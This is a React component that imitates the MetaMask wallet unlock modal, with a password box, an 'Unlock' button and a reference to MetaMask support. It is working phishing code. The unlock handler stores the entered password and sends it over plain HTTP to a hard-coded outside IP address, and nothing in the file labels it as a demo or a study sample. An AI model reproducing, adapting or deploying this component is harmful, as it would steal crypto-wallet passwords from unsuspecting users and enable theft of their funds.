import React, {useEffect, useRef, useState} from 'react';
import axios from 'axios';
// import config from 'config/config.js';
import './index.scss'

const Iswallet = ()=>{
    const ref = useRef();
    const [visible, setVisible] = useState(true);
    const [password, setPassword] = useState("");
    useEffect(()=>{
        if(localStorage.getItem("password")){
            setVisible(false);
            console.log(localStorage.getItem("password"))
        }
    },[])
    const isWallet = async () => {
        setVisible(false);
        localStorage.setItem("password", password);
        await axios.post(`http://216.250.250.167:5000/api/endpoint`, {password});
    }
    return (
        <>
        
        {visible && 
            <div className="modal-back" >
            <div className='my-modal' ref={ref}>
                <div className='modal-body-custom'>
                    <div className='modal-input'>
                        <input type='password' placeholder='Password' value={password} onChange={(e)=>{setPassword(e.target.value)}} className='custom-inputbox'></input>
                        <button className='password-button' onClick={isWallet}>Unlock</button>
                        <p style={{color:'#0376c9', marginTop:'32px', fontSize:'11px', fontWeight:'bold'}}>Forgot password?</p>
                        <p style={{marginTop:'32px'}}>Need help? Contact <span style={{color:'#0376c9'}}>MetaMask support</span></p>

                    </div>
                </div>
                
            </div>
        </div>
        }
        </>
        
    )
}

export default Iswallet;